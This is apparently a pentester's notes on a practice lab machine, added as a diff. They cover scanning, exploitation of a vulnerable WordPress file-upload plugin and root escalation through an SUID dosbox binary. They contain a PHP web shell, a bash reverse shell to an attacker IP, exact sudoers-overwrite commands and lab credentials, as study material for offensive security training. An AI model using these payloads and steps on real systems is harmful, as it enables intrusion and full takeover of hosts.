@@ -1,0 +1,147 @@
+192.168.104.105
+
+TODO:
+	[-] enum web app on port 80
+	[+] use wpscan on web server
+	[+] exploit Simple File List plugin
+	[-] explore file upload shell for profile pic
+	[-] enumerate SMB on 36445/tcp
+	[+] enumerate SUID binaries
+	[-] try exploit vulns to existing CVEs
+	[+] use founds db creds to gain access to mysql db
+	[+] exploit dosbox SUID binary using GTFObins
+
+
+CREDS:
+	commander:CommanderKeenVorticons1990
+
+--------------SCANNING--------------
+22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
+|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
+|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
+80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+|_http-generator: WordPress 5.5.1
+|_http-title: Retro Gamming &#8211; Just another WordPress site
+3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
+5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
+|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
+|_http-title: 404 Not Found
+36445/tcp open  netbios-ssn Samba smbd 4
+13000/tcp open  unknown syn-ack ttl 61
+
+
+
+--------------WEB APP-------------- Apache 2.4.46
+wordpress site -> WPscan
+-> found user "Admin"
+Created an "Instructor" user
+-> has file upload for profile pic
+scanning with wpscan...
+-> found vuln plugin "Simple File List" version 4.2.2 (File Upload Vuln)
+-> found vuln plugin "tutor" version 1.5.3 (multiple searchsploit vulns)
+
+attempting to exploit Simple File List...
+edited payload to => <?php system($_REQUEST['cmd']) ?>
+naviagted to uploaded file and added cmd as query param
+-> Worked! achieved RCE
+-> tryna get revshell now...
+
+generating 64bit msfvenom revshell to upload
+-> didn't work
+
+edited exploit payload to => payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.163/80 0>&1"); ?>'
+-> started listener...
+-> python3 48449.py http://192.168.104.105
+-> worked! GOT REVERSE SHELL!
+
+cat /home/commander/local.txt
+9e1ec83bae92f949155660e471ec4e8d
+
+
+
+--------------PRIVESC--------------
+found user:
+commander:x:1000:1000::/home/commander:/bin/bash
+
+transferring lse.sh to target
+target vuln to pwnkit.. transferring pwnkit over...
+PwnKit didn't work.
+
+transferring suggester.sh to target
+suggester.sh => [CVE-2021-3490] probable... potential vector
+
+lse.sh found interesting SUID binaries:
+/usr/lib/ssh/ssh-keysign
+/usr/lib/Xorg.wrap
+/usr/bin/ksu
+/usr/bin/dosbox
+/usr/bin/mount.cifs
+/usr/bin/suexec
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/sg
+/usr/bin/unix_chkpwd
+
+manual enum...
+found creds in /srv/http/wp-config.php:
+	define( 'DB_NAME', 'wordpress' );
+	define( 'DB_USER', 'commander' );
+	define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+	define( 'DB_HOST', 'localhost' );
+	define( 'DB_CHARSET', 'utf8' );
+	define( 'DB_COLLATE', '' );
+	define( 'AUTH_KEY',         'put your unique phrase here' );
+	define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+	define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+	define( 'NONCE_KEY',        'put your unique phrase here' );
+	define( 'AUTH_SALT',        'put your unique phrase here' );
+	define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+	define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+	define( 'NONCE_SALT',       'put your unique phrase here' );
+
+commander:CommanderKeenVorticons1990 worked on mysql, gained access to DB, enumerating...
+found wp-users table, admin hash is $P$BoktR9dJnCOMHiLEnYkPfS1Ae/7vPq/
+
+tried commander:CommanderKeenVorticons1990 with SSH, it worked! we are on user commander now...
+
+identified vuln SUID dosbox:
+=> Allowed unauthenticated filewrite
+=> This function can be performed by any unprivileged user.
+=> dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
+got confused with dosbox syntax...
+what to do when i have arbitrary file write?
+can try:
+1. write to root authorised key file (what this mean?)
+2. add /etc/passwd entry
+3. add entry to /etc/sudoers <- worked!
+
+[commander@nukem ~]$ LFILE='/etc/sudoers'                                                                              
+[commander@nukem ~]$ /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
+[commander@nukem ~]$ sudo -l
+Runas and Command-specific defaults for commander:
+    Defaults!/etc/ctdb/statd-callout !requiretty
+
+User commander may run the following commands on nukem:
+    (ALL) NOPASSWD: ALL
+[commander@nukem ~]$ sudo su
+[root@nukem commander]# id
+uid=0(root) gid=0(root) groups=0(root)
+[root@nukem commander]# cat /root/proof.txt
+4167343b944f253569ca50e220035b98
+
+
+
+--------------SUMMARY--------------
+WordPress web app with outdated vulnerable plugins -> File upload vuln on simple-file-list plugin -> led to RCE with public exploit -> Reverse Shell as user http -> Misconfigured wp-config.php file contained plaintext password of SQL user commander:CommanderKeenVorticons1990 -> credential spray using SSH worked, access as user commander -> Identified vuln SUID binary dosbox with unauthenticated file write -> edited /etc/sudoers to include ALL commands for user commander -> sudo su got root.
+
+Key Takeaways:
+1. Find and edit payloads in public exploits.
+2. Use <?php system($_REQUEST['cmd']) ?>
+3. Even better, use <?php passthru("bash -i >& /dev/tcp/192.168.45.163/80 0>&1"); ?>
+4. Manually look around for config files!!
+5. When faced with SUID binary, read docs to understand how to use, then can exploit properly
+6. Know what steps to take when I have misconfigured perms
